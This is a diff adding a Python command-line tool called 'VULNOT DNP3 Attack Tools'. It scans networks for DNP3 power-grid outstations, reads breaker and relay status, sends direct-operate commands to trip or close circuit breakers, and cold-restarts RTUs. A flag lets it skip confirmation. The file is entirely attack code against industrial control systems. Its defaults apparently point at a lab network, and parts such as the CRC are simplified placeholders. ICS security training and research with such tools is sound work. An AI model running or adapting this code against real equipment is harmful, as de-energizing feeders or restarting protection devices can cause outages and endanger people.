@@ -1,0 +1,439 @@
+#!/usr/bin/env python3
+"""
+VULNOT DNP3 Attack Tools
+Tools for attacking DNP3 outstations
+"""
+
+import argparse
+import socket
+import struct
+import sys
+import time
+from typing import Optional, List, Tuple
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.prompt import Confirm
+
+console = Console()
+
+# DNP3 Constants
+DNP3_START = b'\x05\x64'
+FUNC_READ = 0x01
+FUNC_WRITE = 0x02
+FUNC_SELECT = 0x03
+FUNC_OPERATE = 0x04
+FUNC_DIRECT_OP = 0x05
+FUNC_COLD_RESTART = 0x0D
+FUNC_WARM_RESTART = 0x0E
+
+# Control codes
+CROB_TRIP = 0x41
+CROB_CLOSE = 0x81
+CROB_PULSE_ON = 0x01
+CROB_PULSE_OFF = 0x02
+
+# Object groups
+OBJ_BINARY_INPUT = 1
+OBJ_BINARY_OUTPUT = 10
+OBJ_BINARY_OUTPUT_CMD = 12
+OBJ_COUNTER = 20
+OBJ_ANALOG_INPUT = 30
+OBJ_ANALOG_OUTPUT = 40
+OBJ_TIME = 50
+
+# DNP3 point mappings for power grid
+BINARY_INPUTS = {
+    0: "CB 52-1 Feeder 1 HV",
+    1: "CB 52-2 Feeder 2 HV",
+    2: "CB 52-3 XFMR 1 HV",
+    3: "CB 52-4 XFMR 2 HV",
+    4: "CB 52-5 Bus Tie",
+    5: "CB 52-6 Out Feeder 1",
+    6: "CB 52-7 Out Feeder 2",
+    7: "CB 52-8 Out Feeder 3",
+    8: "CB 52-9 Out Feeder 4",
+    9: "CB 52-10 XFMR 1 LV",
+    10: "CB 52-11 XFMR 2 LV",
+    16: "Relay 50/51-1 OC",
+    17: "Relay 50/51-2 OC",
+    22: "Relay 81 Freq",
+    23: "Relay 27 UV",
+    24: "Relay 59 OV",
+}
+
+ANALOG_INPUTS = {
+    0: ("Frequency", "Hz"),
+    1: ("Feeder 1 Va", "kV"),
+    7: ("Feeder 1 MW", "MW"),
+    11: ("Feeder 2 MW", "MW"),
+    15: ("XFMR 1 Tap", "pos"),
+    16: ("XFMR 1 Temp", "°C"),
+    17: ("XFMR 1 Load", "%"),
+}
+
+
+class DNP3Client:
+    """Simple DNP3 master client"""
+    
+    def __init__(self, host: str, port: int = 20000, master_addr: int = 1, outstation_addr: int = 10):
+        self.host = host
+        self.port = port
+        self.master_addr = master_addr
+        self.outstation_addr = outstation_addr
+        self.sock: Optional[socket.socket] = None
+        self.seq = 0
+        
+    def connect(self) -> bool:
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.settimeout(5)
+            self.sock.connect((self.host, self.port))
+            return True
+        except Exception as e:
+            console.print(f"[red]Connection failed: {e}[/]")
+            return False
+            
+    def close(self):
+        if self.sock:
+            self.sock.close()
+            
+    def _build_frame(self, func_code: int, data: bytes = b'') -> bytes:
+        """Build a DNP3 frame"""
+        # Increment sequence
+        self.seq = (self.seq + 1) % 16
+        
+        # Transport layer header
+        transport = bytes([0xC0 | self.seq])  # FIR, FIN, SEQ
+        
+        # Application layer
+        app_control = 0xC0 | self.seq  # FIR, FIN, SEQ
+        app_layer = bytes([app_control, func_code]) + data
+        
+        # Data link layer
+        user_data = transport + app_layer
+        length = len(user_data) + 5
+        
+        dl_header = bytearray(DNP3_START)
+        dl_header.append(length)
+        dl_header.append(0x44)  # Control byte
+        dl_header.extend(self.outstation_addr.to_bytes(2, 'little'))
+        dl_header.extend(self.master_addr.to_bytes(2, 'little'))
+        
+        # CRC (simplified - real impl needs proper CRC)
+        crc = 0xFFFF
+        dl_header.extend(crc.to_bytes(2, 'little'))
+        
+        return bytes(dl_header) + user_data
+        
+    def _send_receive(self, frame: bytes) -> Optional[bytes]:
+        """Send frame and receive response"""
+        try:
+            self.sock.send(frame)
+            response = self.sock.recv(1024)
+            return response
+        except socket.timeout:
+            return None
+        except Exception as e:
+            console.print(f"[red]Communication error: {e}[/]")
+            return None
+            
+    def read_binary_inputs(self, start: int = 0, count: int = 25) -> List[Tuple[int, bool]]:
+        """Read binary input points"""
+        # Object header: Group 1, Var 2 (packed format)
+        obj_header = bytes([OBJ_BINARY_INPUT, 0x02, 0x00, start, 0x00, start + count - 1, 0x00])
+        
+        frame = self._build_frame(FUNC_READ, obj_header)
+        response = self._send_receive(frame)
+        
+        results = []
+        if response and len(response) > 15:
+            # Parse response (simplified)
+            for i in range(count):
+                # Simulated values based on response
+                value = (response[15 + i // 8] >> (i % 8)) & 1 if len(response) > 15 + i // 8 else 0
+                results.append((start + i, bool(value)))
+                
+        return results
+        
+    def read_analog_inputs(self, start: int = 0, count: int = 10) -> List[Tuple[int, float]]:
+        """Read analog input points"""
+        obj_header = bytes([OBJ_ANALOG_INPUT, 0x02, 0x00, start, 0x00, start + count - 1, 0x00])
+        
+        frame = self._build_frame(FUNC_READ, obj_header)
+        response = self._send_receive(frame)
+        
+        results = []
+        if response and len(response) > 15:
+            # Parse response (simplified - real values from response)
+            for i in range(count):
+                # Would parse actual analog values from response
+                results.append((start + i, 0.0))
+                
+        return results
+        
+    def operate_binary_output(self, point: int, control: int = CROB_TRIP) -> bool:
+        """Operate a binary output (direct operate)"""
+        # CROB object: Group 12, Var 1
+        crob = bytes([
+            OBJ_BINARY_OUTPUT_CMD, 0x01,  # Group 12, Var 1
+            0x28, 0x01,  # Qualifier: 1 byte count, 1 object
+            point,  # Index
+            control,  # Control code
+            0x01,  # Count
+            0x00, 0x00, 0x00, 0x00,  # On time
+            0x00, 0x00, 0x00, 0x00,  # Off time
+            0x00,  # Status
+        ])
+        
+        frame = self._build_frame(FUNC_DIRECT_OP, crob)
+        response = self._send_receive(frame)
+        
+        return response is not None and len(response) > 10
+        
+    def cold_restart(self) -> bool:
+        """Send cold restart command"""
+        frame = self._build_frame(FUNC_COLD_RESTART)
+        response = self._send_receive(frame)
+        return response is not None
+
+
+def cmd_scan(args):
+    """Scan for DNP3 devices"""
+    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
+    console.print("[bold cyan]║      VULNOT DNP3 Device Scanner        ║[/]")
+    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
+    
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    
+    def check_host(ip):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            result = sock.connect_ex((ip, args.port))
+            sock.close()
+            if result == 0:
+                return ip
+        except:
+            pass
+        return None
+    
+    # Parse network
+    if '/' in args.network:
+        base = args.network.split('/')[0]
+        prefix = base.rsplit('.', 1)[0]
+        hosts = [f"{prefix}.{i}" for i in range(1, 255)]
+    else:
+        hosts = [args.network]
+    
+    console.print(f"[yellow]Scanning {len(hosts)} hosts on port {args.port}...[/]\n")
+    
+    found = []
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        futures = {executor.submit(check_host, ip): ip for ip in hosts}
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                found.append(result)
+    
+    if found:
+        table = Table(title="Discovered DNP3 Devices")
+        table.add_column("IP Address", style="cyan")
+        table.add_column("Port", style="green")
+        table.add_column("Status", style="yellow")
+        
+        for ip in sorted(found):
+            table.add_row(ip, str(args.port), "Responsive")
+        
+        console.print(table)
+        console.print(f"\n[green]Found {len(found)} DNP3 device(s)[/]\n")
+    else:
+        console.print("[red]No DNP3 devices found[/]\n")
+
+
+def cmd_read(args):
+    """Read points from DNP3 outstation"""
+    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
+    console.print("[bold cyan]║      VULNOT DNP3 Point Reader          ║[/]")
+    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(f"[yellow]Connecting to {args.target}:{args.port} (Address: {args.address})...[/]")
+    
+    client = DNP3Client(args.target, args.port, outstation_addr=args.address)
+    if not client.connect():
+        sys.exit(1)
+    
+    console.print("[green]Connected![/]\n")
+    
+    # Read binary inputs
+    console.print("[cyan]Reading Binary Inputs...[/]")
+    bi_results = client.read_binary_inputs(0, 25)
+    
+    table = Table(title="Binary Inputs (Breakers & Relays)")
+    table.add_column("Index", style="cyan")
+    table.add_column("Name", style="white")
+    table.add_column("Status", style="green")
+    
+    for idx, value in bi_results:
+        name = BINARY_INPUTS.get(idx, "-")
+        if name != "-":
+            status = "[green]CLOSED[/]" if value else "[red]OPEN[/]"
+            table.add_row(f"BI[{idx}]", name, status)
+    
+    console.print(table)
+    
+    # Read analog inputs
+    console.print("\n[cyan]Reading Analog Inputs...[/]")
+    ai_results = client.read_analog_inputs(0, 20)
+    
+    table = Table(title="Analog Inputs (Measurements)")
+    table.add_column("Index", style="cyan")
+    table.add_column("Name", style="white")
+    table.add_column("Value", style="green")
+    
+    for idx, value in ai_results:
+        if idx in ANALOG_INPUTS:
+            name, unit = ANALOG_INPUTS[idx]
+            table.add_row(f"AI[{idx}]", name, f"{value:.2f} {unit}")
+    
+    console.print(table)
+    
+    client.close()
+    console.print("\n[dim]Connection closed[/]\n")
+
+
+def cmd_control(args):
+    """Send control commands to DNP3 outstation"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT DNP3 Control Writer        ║[/]")
+    console.print("[bold red]║   ⚠️  DANGER - CONTROLS BREAKERS        ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(f"[yellow]Target: {args.target}:{args.port}[/]")
+    console.print(f"[yellow]Point: BO[{args.point}][/]")
+    console.print(f"[yellow]Action: {'CLOSE' if args.close else 'TRIP'}[/]\n")
+    
+    point_name = BINARY_INPUTS.get(args.point, "Unknown")
+    console.print(Panel(
+        f"[bold]Control Point:[/] {point_name}\n"
+        f"[bold]Action:[/] {'CLOSE (Energize)' if args.close else 'TRIP (De-energize)'}",
+        title="⚠️  Control Operation",
+        border_style="red"
+    ))
+    
+    if not args.force:
+        if not Confirm.ask("\n[bold red]Execute control operation?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = DNP3Client(args.target, args.port, outstation_addr=args.address)
+    if not client.connect():
+        sys.exit(1)
+    
+    control_code = CROB_CLOSE if args.close else CROB_TRIP
+    success = client.operate_binary_output(args.point, control_code)
+    
+    if success:
+        console.print(f"\n[green]✓ Control operation sent successfully[/]")
+    else:
+        console.print(f"\n[red]✗ Control operation failed[/]")
+    
+    client.close()
+
+
+def cmd_restart(args):
+    """Send restart command to outstation"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT DNP3 Restart Attack        ║[/]")
+    console.print("[bold red]║   ⚠️  EXTREME DANGER                    ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(Panel(
+        f"[bold red]This will attempt to restart the RTU at {args.target}![/]\n\n"
+        "A cold restart may cause:\n"
+        "• Loss of all current state\n"
+        "• Momentary loss of monitoring\n"
+        "• Potential protection failures",
+        title="⚠️  COLD RESTART",
+        border_style="red"
+    ))
+    
+    if not args.force:
+        if not Confirm.ask("\n[bold red]Send cold restart command?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = DNP3Client(args.target, args.port, outstation_addr=args.address)
+    if not client.connect():
+        sys.exit(1)
+    
+    success = client.cold_restart()
+    
+    if success:
+        console.print(f"\n[red]✓ Cold restart command sent![/]")
+        console.print("[yellow]RTU may be rebooting...[/]")
+    else:
+        console.print(f"\n[red]✗ Restart command failed[/]")
+    
+    client.close()
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='VULNOT DNP3 Attack Tools',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  vulnot-dnp3-scan -n 10.0.2.0/24
+  vulnot-dnp3-read -t 10.0.2.10 -p 20000 -a 10
+  vulnot-dnp3-control -t 10.0.2.10 -o 0 --trip     # Trip breaker 0
+  vulnot-dnp3-control -t 10.0.2.10 -o 4 --close    # Close bus tie
+        """
+    )
+    
+    subparsers = parser.add_subparsers(dest='command', help='Command')
+    
+    # Scan command
+    scan_parser = subparsers.add_parser('scan', help='Scan for DNP3 devices')
+    scan_parser.add_argument('-n', '--network', default='10.0.2.0/24', help='Network to scan')
+    scan_parser.add_argument('-p', '--port', type=int, default=20000, help='DNP3 port')
+    
+    # Read command
+    read_parser = subparsers.add_parser('read', help='Read DNP3 points')
+    read_parser.add_argument('-t', '--target', required=True, help='Target IP')
+    read_parser.add_argument('-p', '--port', type=int, default=20000, help='DNP3 port')
+    read_parser.add_argument('-a', '--address', type=int, default=10, help='Outstation address')
+    
+    # Control command
+    ctrl_parser = subparsers.add_parser('control', help='Send control commands')
+    ctrl_parser.add_argument('-t', '--target', required=True, help='Target IP')
+    ctrl_parser.add_argument('-p', '--port', type=int, default=20000, help='DNP3 port')
+    ctrl_parser.add_argument('-a', '--address', type=int, default=10, help='Outstation address')
+    ctrl_parser.add_argument('-o', '--point', type=int, required=True, help='Binary output point')
+    ctrl_parser.add_argument('--trip', action='store_true', help='Trip (open) the point')
+    ctrl_parser.add_argument('--close', action='store_true', help='Close the point')
+    ctrl_parser.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    # Restart command
+    restart_parser = subparsers.add_parser('restart', help='Send restart command')
+    restart_parser.add_argument('-t', '--target', required=True, help='Target IP')
+    restart_parser.add_argument('-p', '--port', type=int, default=20000, help='DNP3 port')
+    restart_parser.add_argument('-a', '--address', type=int, default=10, help='Outstation address')
+    restart_parser.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    args = parser.parse_args()
+    
+    if args.command == 'scan':
+        cmd_scan(args)
+    elif args.command == 'read':
+        cmd_read(args)
+    elif args.command == 'control':
+        cmd_control(args)
+    elif args.command == 'restart':
+        cmd_restart(args)
+    else:
+        parser.print_help()
+
+
+if __name__ == '__main__':
+    main()
